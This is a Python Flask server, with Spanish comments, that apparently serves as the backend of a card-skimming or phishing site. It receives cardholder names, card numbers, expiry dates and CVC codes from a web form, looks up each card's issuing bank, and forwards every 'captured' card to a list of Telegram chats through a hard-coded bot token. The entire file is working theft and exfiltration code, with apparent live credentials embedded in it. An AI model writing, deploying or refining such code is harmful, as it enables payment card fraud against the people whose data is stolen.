import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app)

# --- CONFIGURACIÓN ---
# Tu Token de Telegram
TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'

# LISTA DE RECEPTORES (Añade aquí todos los IDs que quieras que reciban la info)
# El servidor enviará la tarjeta a TODOS los que estén en esta lista.
LISTA_DE_RECEPTORES = [
    '6953415010', 
    '7707049896'
]

# --- FUNCIÓN PARA CONSULTAR EL BANCO (BIN LOOKUP) ---
def get_bank_info(card_number):
    try:
        # Tomamos los primeros 6 dígitos
        bin_number = card_number[:6]
        url = f"https://lookup.binlist.net/{bin_number}"
        
        # IMPORTANTE: Añadimos Headers para que la API no nos bloquee
        headers = {
            'Accept-Version': '3',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }

        response = requests.get(url, headers=headers, timeout=5)
        
        if response.status_code == 200:
            data = response.json()
            scheme = data.get('scheme', 'TARJETA').upper()
            type_card = data.get('type', 'DESCONOCIDO').upper()
            country = data.get('country', {}).get('name', 'Desconocido')
            bank_name = data.get('bank', {}).get('name', 'Banco Desconocido')
            
            # Formateamos la respuesta para que se vea limpia en Telegram
            return f"{bank_name} | {type_card} | {country}"
        elif response.status_code == 429:
            return "Banco: Límite de consultas (Espera un poco)"
        else:
            return "Banco: Desconocido"
    except Exception as e:
        print(f"Error en consulta de banco: {e}")
        return "Banco: Error de conexión"

@app.route('/enviar-datos', methods=['POST'])
def recibir_datos():
    data = request.json
    
    # El target_id que viene del HTML se usa para validar que la petición es real
    target_id = str(data.get('target_id'))

    # --- VALIDACIÓN DE SEGURIDAD ---
    # Solo procesamos si el ID que manda la web es uno de tus IDs autorizados
    if target_id not in LISTA_DE_RECEPTORES:
        print(f"🚫 Petición rechazada. ID {target_id} no está en la lista.")
        return jsonify({"status": "ignored"}), 200

    # 1. Capturar datos de la web
    nombre = data.get('nombre', 'N/A')
    tarjeta = data.get('tarjeta', 'N/A')
    expiracion = data.get('expiracion', 'N/A')
    cvc = data.get('cvc', 'N/A')

    # 2. Consultar el banco automáticamente
    print(f"🔍 Consultando información del banco para la tarjeta: {tarjeta[:6]}...")
    info_banco = get_bank_info(tarjeta)

    # 3. Construir el mensaje de Telegram (Formato Profesional)
    mensaje = (
        "💰 *NUEVA CC CAPTURADA* 💰\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"👤 *Nombre:* `{nombre}`\n"
        f"💳 *Tarjeta:* `{tarjeta}`\n"
        f"📅 *Exp:* `{expiracion}`\n"
        f"🔐 *CVC:* `{cvc}`\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"🏦 *INFO:* `{info_banco}`\n"
        "━━━━━━━━━━━━━━━━━━"
    )

    # 4. REPARTO MASIVO: Enviamos el mensaje a TODOS los de la lista
    exitos = 0
    for receptor in LISTA_DE_RECEPTORES:
        url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": receptor, 
            "text": mensaje, 
            "parse_mode": "Markdown"
        }
        try:
            res = requests.post(url_telegram, json=payload)
            if res.status_code == 200:
                exitos += 1
                print(f"✅ Mensaje enviado a: {receptor}")
            else:
                print(f"❌ Error al enviar a {receptor}: {res.text}")
        except Exception as e:
            print(f"❌ Error de red al enviar a {receptor}: {e}")

    print(f"🏁 Proceso terminado. Mensajes enviados con éxito a {exitos} personas.")
    return jsonify({"status": "success", "enviados": exitos}), 200

if __name__ == '__main__':
    # Ejecución en el puerto que asigne Railway
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
